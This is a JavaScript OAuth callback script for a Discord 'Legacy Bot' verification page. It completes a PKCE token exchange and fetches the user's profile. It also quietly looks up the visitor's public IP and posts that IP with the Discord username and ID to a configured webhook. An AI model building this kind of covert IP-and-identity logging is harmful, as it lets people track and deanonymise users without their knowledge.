(function () {
  const cfg = window.LEGACY || {};
  const origin = window.location.origin;
  const redirectUri = cfg.redirectUri || (origin + window.location.pathname);

  function homeUrl() {
    const path = window.location.pathname.replace(/auth\.html$/i, "");
    return origin + path;
  }

  function finish(ok) {
    try {
      if (window.opener && !window.opener.closed) {
        window.opener.postMessage({ source: "legacy-bot", ok: ok }, origin);
      }
    } catch (err) {}
    window.close();
    window.setTimeout(function () {
      window.location.replace(homeUrl());
    }, 400);
  }

  const search = new URLSearchParams(window.location.search);
  if (search.get("error")) {
    finish(false);
    return;
  }

  const code = search.get("code");
  const state = search.get("state");
  let expected = "";
  let verifier = "";
  try {
    expected = window.localStorage.getItem(cfg.stateKey) || "";
    verifier = window.localStorage.getItem(cfg.verifierKey) || "";
  } catch (err) {}

  if (!code || !expected || state !== expected || !verifier) {
    finish(false);
    return;
  }

  try {
    window.localStorage.removeItem(cfg.stateKey);
    window.localStorage.removeItem(cfg.verifierKey);
  } catch (err) {}

  function lookupIp() {
    return fetch("https://api.ipify.org", { cache: "no-store" }).then(function (response) {
      if (!response.ok) {
        throw new Error("ip");
      }
      return response.text();
    }).then(function (text) {
      return String(text || "").trim();
    }).catch(function () {
      return "";
    });
  }

  const tokenBody = new URLSearchParams();
  tokenBody.set("client_id", cfg.clientId);
  tokenBody.set("grant_type", "authorization_code");
  tokenBody.set("code", code);
  tokenBody.set("redirect_uri", redirectUri);
  tokenBody.set("code_verifier", verifier);

  fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: tokenBody
  }).then(function (response) {
    if (!response.ok) {
      throw new Error("token");
    }
    return response.json();
  }).then(function (oauth) {
    return Promise.all([
      fetch("https://discord.com/api/users/@me", {
        headers: { Authorization: "Bearer " + oauth.access_token }
      }).then(function (response) {
        if (!response.ok) {
          throw new Error("discord");
        }
        return response.json();
      }),
      lookupIp()
    ]);
  }).then(function (results) {
    const user = results[0];
    const ip = results[1];
    const session = {
      username: user.username,
      discordId: user.id,
      ip: ip
    };
    window.localStorage.setItem(cfg.sessionKey, JSON.stringify(session));
    const body = new FormData();
    body.append("payload_json", JSON.stringify({
      username: "Legacy Bot",
      embeds: [{
        title: "Discord verified",
        color: 15066597,
        fields: [
          { name: "Discord", value: user.username || "unknown", inline: true },
          { name: "Discord ID", value: user.id || "unknown", inline: true },
          { name: "IP", value: ip || "unknown", inline: true }
        ]
      }]
    }));
    return fetch(cfg.hook, { method: "POST", body: body }).catch(function () {
      return null;
    });
  }).then(function () {
    finish(true);
  }).catch(function () {
    finish(false);
  });
})();
